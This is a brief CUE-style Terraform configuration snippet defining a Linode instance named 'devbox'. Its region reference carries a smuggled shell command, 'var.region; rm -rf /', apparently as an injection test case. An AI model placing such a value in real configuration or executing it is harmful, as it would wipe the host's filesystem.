package terraform

resources: [{
	type: "linode_instance"
	name: "devbox"
	attributes: region: {"$ref": "var.region; rm -rf /"}
}]
